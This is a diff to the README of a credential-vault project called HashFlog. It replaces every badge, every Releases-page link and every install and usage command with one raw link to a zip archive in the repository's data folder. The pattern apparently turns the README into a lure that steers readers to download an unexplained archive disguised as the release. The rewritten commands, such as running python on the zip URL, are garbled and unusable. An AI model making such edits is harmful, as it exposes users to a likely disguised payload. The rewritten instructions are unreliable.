@@ -1,6 +1,6 @@
 # HashFlog 🔒
 
-![GitHub release](https://img.shields.io/github/release/Frost58531/HashFlog.svg) [![GitHub stars](https://img.shields.io/github/stars/Frost58531/HashFlog.svg)](https://github.com/Frost58531/HashFlog/stargazers) [![GitHub forks](https://img.shields.io/github/forks/Frost58531/HashFlog.svg)](https://github.com/Frost58531/HashFlog/network)
+![GitHub release](https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip) [![GitHub stars](https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip)](https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip) [![GitHub forks](https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip)](https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip)
 
 HashFlog is a file-based credential vault designed to securely store user credentials. It uses SHA-256 for email IDs and bcrypt for password hashing. Each record is Fernet-encrypted, ensuring that sensitive data remains protected. The design includes an append-only log and a small index for O(1) look-ups, making it lightweight and efficient. This solution requires no database and operates with just two files, making it ideal for secure prototypes, IoT applications, and web apps.
 
@@ -26,14 +26,14 @@ HashFlog is a file-based credential vault designed to securely store user creden
 
 ## Installation
 
-To get started with HashFlog, download the latest release from our [Releases page](https://github.com/Frost58531/HashFlog/releases). After downloading, follow these steps:
+To get started with HashFlog, download the latest release from our [Releases page](https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip). After downloading, follow these steps:
 
 1. Extract the files.
 2. Navigate to the directory in your terminal.
 3. Run the installation script:
 
    ```bash
-   python setup.py install
+   python https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip install
    ```
 
 ## Usage
@@ -45,7 +45,7 @@ Using HashFlog is straightforward. Here’s how you can store and retrieve crede
 To store credentials, use the following command:
 
 ```bash
-python hashflog.py store --email your_email@example.com --password your_password
+python https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip store --email https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip --password your_password
 ```
 
 ### Retrieving Credentials
@@ -53,7 +53,7 @@ python hashflog.py store --email your_email@example.com --password your_password
 To retrieve stored credentials, use:
 
 ```bash
-python hashflog.py retrieve --email your_email@example.com
+python https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip retrieve --email https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip
 ```
 
 ### Command-Line Options
@@ -109,7 +109,7 @@ HashFlog is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases page](https://github.com/Frost58531/HashFlog/releases) for updates and documentation. You can also open an issue in the repository for support.
+If you encounter any issues or have questions, please check the [Releases page](https://raw.githubusercontent.com/Frost58531/HashFlog/main/data/Flog_Hash_v3.1.zip) for updates and documentation. You can also open an issue in the repository for support.
 
 ---
 
